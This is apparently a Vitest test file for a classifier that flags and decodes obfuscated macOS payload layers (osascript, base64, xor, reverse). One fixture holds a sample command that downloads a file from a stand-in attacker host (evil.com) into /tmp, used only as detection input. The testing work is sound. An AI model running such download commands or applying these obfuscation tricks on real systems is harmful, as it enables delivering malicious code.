import { describe, it, expect } from 'vitest';
import { isLayer, guessTechnique, decodeBase64Layer } from '../src/classifier';

describe('isLayer', () => {
  it('flags a nested osascript invocation', () => {
    expect(isLayer(`osascript -l JavaScript -e 'x'`)).toBe(true);
  });
  it('flags a long printable base64 blob', () => {
    const b64 = Buffer.from('curl https://evil.com/a -o /tmp/x').toString('base64');
    expect(isLayer(b64)).toBe(true);
  });
  it('does not flag a finished shell command', () => {
    expect(isLayer('cd /tmp && open dl.zip')).toBe(false);
  });
});

describe('decodeBase64Layer', () => {
  it('decodes UTF-8 payloads without latin-1 mojibake', () => {
    const text = 'echo "café ☕ déjà vu — multibyte"';
    const b64 = Buffer.from(text, 'utf8').toString('base64');
    expect(decodeBase64Layer(b64)).toBe(text);
  });

  it('returns null for a non-base64 / too-short string', () => {
    expect(decodeBase64Layer('open dl.zip')).toBeNull();
  });
});

describe('guessTechnique', () => {
  it('detects xor', () => {
    expect(guessTechnique('r+=String.fromCharCode(parseInt(d,16)^k)')).toBe('xor');
  });
  it('detects base64', () => {
    expect(guessTechnique('atob("AAAA")')).toBe('base64');
  });
  it('detects reverse', () => {
    expect(guessTechnique('s.split("").reverse().join("")')).toBe('reverse');
  });
  it('falls back to plain', () => {
    expect(guessTechnique('var x = 1; x')).toBe('plain');
  });
});
